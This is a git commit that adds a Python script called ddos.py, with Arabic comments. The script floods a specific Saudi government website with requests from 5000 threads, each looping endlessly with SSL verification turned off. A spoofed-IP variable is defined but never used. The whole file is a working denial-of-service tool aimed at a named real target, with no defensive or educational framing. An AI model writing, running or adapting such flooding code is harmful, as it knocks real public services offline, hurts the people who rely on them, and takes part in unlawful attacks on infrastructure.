9e4c1a313fa8be4424d7731907e2234bf0e39eb7
rrqr <76810190+rrqr@users.noreply.github.com>
2024-06-09 05:30:18 +0300

    ddos.py

---
+++ ddos.py
@@ -0,0 +1,37 @@
+import requests
+import threading
+import urllib3
+
+# تعطيل التحقق من صحة شهادة SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+target = 'https://www.sdb.gov.sa/'
+fake_ip = '182.21.20.32'
+
+headers = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+}
+
+def attack():
+    while True:
+        try:
+            response = requests.get(target, headers=headers, verify=False)
+            print("تم إرسال الطلب إلى:", target)
+        except Exception as e:
+            print("حدث خطأ:", e)
+
+for i in range(5000):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+# إضافة response = requests.get(target, headers=headers, verify=False)
+response = requests.get(target, headers=headers, verify=False)
+print(response.text)
+
+# تعديل معلمة verify في كائن Session
+session = requests.Session()
+session.verify = False
+
+# يمكن استخدام الدالة session.get() بدلاً من requests.get()
+response = session.get(target, headers=headers)
+print(response.text)
